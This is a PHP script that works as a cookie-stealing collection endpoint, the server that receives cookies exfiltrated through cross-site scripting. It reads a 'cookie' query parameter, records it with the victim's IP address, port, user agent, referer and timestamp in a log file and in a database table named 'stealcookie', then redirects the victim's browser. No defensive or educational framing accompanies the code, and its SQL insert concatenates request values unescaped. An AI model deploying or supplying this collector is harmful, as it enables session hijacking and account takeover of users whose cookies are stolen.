<?php 
// error_reporting(0);

function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 

function url_origin( $s, $use_forwarded_host = false )
{
    $ssl      = ( ! empty( $s['HTTPS'] ) && $s['HTTPS'] == 'on' );
    $sp       = strtolower( $s['SERVER_PROTOCOL'] );
    $protocol = substr( $sp, 0, strpos( $sp, '/' ) ) . ( ( $ssl ) ? 's' : '' );
    $port     = $s['SERVER_PORT'];
    $port     = ( ( ! $ssl && $port=='80' ) || ( $ssl && $port=='443' ) ) ? '' : ':'.$port;
    $host     = ( $use_forwarded_host && isset( $s['HTTP_X_FORWARDED_HOST'] ) ) ? $s['HTTP_X_FORWARDED_HOST'] : ( isset( $s['HTTP_HOST'] ) ? $s['HTTP_HOST'] : null );
    $host     = isset( $host ) ? $host : $s['SERVER_NAME'] . $port;
    return $protocol . '://' . $host;
}

function full_url( $s, $use_forwarded_host = false )
{
    return url_origin( $s, $use_forwarded_host ) . $s['REQUEST_URI'];
}

function logData() 
{ 
	$ipLog="log.txt"; 
	//$cookie = $_SERVER['QUERY_STRING']; 
	$cookie = $_GET['cookie']; 
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 

	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$rqst_method = $_SERVER['REQUEST_METHOD']; 
	//$rem_host = $_SERVER['REMOTE_HOST']; 
	$rem_host = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[REMOTE_ADDR]"; 
	$httpprotocol = $_SERVER['SERVER_PROTOCOL'];
	$referer = $_SERVER['HTTP_REFERER']; 
	$date=date ("l dS of F Y h:i:s A"); 
	$log=fopen("$ipLog", "a+"); 

	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
		fputs($log, "IP: $ip | PORT: $rem_port | Protocol: $httpprotocol | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br>"); 
	else 
		fputs($log, "IP: $ip | PORT: $rem_port | Protocol: $httpprotocol | HOST: $rem_host |  Agent: $user_agent | METHOD: $rqst_method | REF: $referer |  DATE: $date | COOKIE:  $cookie \n\n");
	require 'config.php';
	$query = "INSERT INTO `stealcookie`(`id`, `ip`, `port`, `protocol`, `host`, `agent`, `method`, `reference`, `date`, `cookie`) VALUES (NULL,'$ip','$rem_port','$httpprotocol','$rem_host','$user_agent','$rqst_method','$referer','$date','$cookie')";
	$result = mysqli_query($conn, $query);
	if ($result) {
		fclose($log);
		echo "<script>javascript:document.location='http://www.gifbin.com/bin/042015/1429551735_rabbit_steals_cookie_from_baby.gif'</script>";
	} else {
		fclose($log);
		echo "<script>javascript:document.location='http://www.google.com'</script>";
	}

} 

logData(); 

?>
